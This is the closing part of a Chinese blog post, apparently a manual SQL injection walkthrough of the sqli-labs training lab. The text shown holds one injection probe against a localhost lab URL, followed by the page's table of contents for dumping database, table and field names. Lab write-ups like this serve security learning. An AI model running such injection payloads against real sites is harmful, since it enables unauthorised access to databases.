<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------确认为字符型注入--------------------</span><br></pre></td></tr></table></figure>


            </div>

            
                <div class="post-copyright-info">
                    <div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li>
            <span class="type">本文标题</span>：<span class="content">sqli-lab(手工注入篇)</span>
        </li>
        <li>
            <span class="type">本文作者</span>：<span class="content">二十八华生</span>
        </li>
        <li>
            <span class="type">创建时间</span>：<span class="content">2022-10-08 22:53:42</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2022/10/08/sqli-lab第一关/</span>
        </li>
        <li>
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">#SQL注入学习</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">《程序员的自我修养:链接装载与库》笔记</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                </div>
            

            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">一、题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">二、判断是否存在SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%88%A4%E6%96%AD%E7%B1%BB%E5%9E%8B"><span class="nav-text">三、判断类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%90%A6%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-text">1.判断漏洞类型是否是数字型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%90%A6%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="nav-text">2.判断漏洞类型是否是字符型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">四、开始注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E8%A1%A8%E6%A0%BC%E6%9C%89%E5%87%A0%E5%88%97"><span class="nav-text">1.获取表格有几列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%88%86%E5%87%BA%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-text">2.爆出显示位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%88%86%E5%87%BA%E5%BA%93%E5%90%8D%E5%92%8C%E7%89%88%E6%9C%AC%E6%88%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%94%A8%E6%88%B7%E5%90%8D"><span class="nav-text">3.爆出库名和版本或操作系统和用户名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%88%86%E5%87%BA%E8%A1%A8%E5%90%8D"><span class="nav-text">4.爆出表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%88%86%E5%87%BA%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="nav-text">5.爆出字段内容</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%90%8E%E8%AE%B0"><span class="nav-text">五、后记</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-text">反思</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Homework"><span class="nav-text">Homework</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">二十八华生</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
